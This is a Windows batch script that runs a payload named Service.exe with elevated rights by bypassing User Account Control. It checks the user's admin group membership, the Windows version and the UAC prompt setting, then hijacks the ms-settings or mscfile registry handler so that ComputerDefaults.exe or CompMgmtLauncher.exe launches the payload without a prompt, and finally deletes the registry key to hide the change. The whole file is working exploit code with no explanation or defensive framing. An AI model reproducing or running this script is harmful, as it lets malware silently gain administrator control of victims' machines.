@echo off
set PLD=C:\Users\RO0T\AppData\Local\Microsoft\WindowsApps\Service.exe
net session >nul 2>&1 || goto :chk
%PLD%
exit /b 2
:chk
whoami /groups | findstr /i "\<S-1-5-32-544\>" >nul 2>&1
if ERRORLEVEL 1 exit /b 1
for /f "tokens=4-5 delims=. " %%i in ('ver') do set WV=%%i.%%j
set key="HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"
for /f "skip=2 tokens=3" %%u in ('REG QUERY %key% /v ConsentPromptBehaviorAdmin') do set /a "UAC=%%u"
if %UAC% equ 2 exit /b 1
if %UAC% equ 5 (
    for %%v in (6.1 6.2 6.3) do if "%WV%" == "%%v" call :exp mscfile CompMgmtLauncher.exe %PLD%
    if "%WV%" == "10.0" call :exp ms-settings ComputerDefaults.exe %PLD%
) >nul 2>&1
if %UAC% equ 0 powershell -c Start-Process "%PLD%" -Verb runas
exit /b 0
:exp <key> <trg> <pld>
set regPth="HKCU\Software\Classes\%1\shell\open\command"
reg add %regPth% /d "%~3" /f
reg add %regPth% /v DelegateExecute /f
%~2
reg delete "HKCU\Software\Classes\%1" /f
exit /b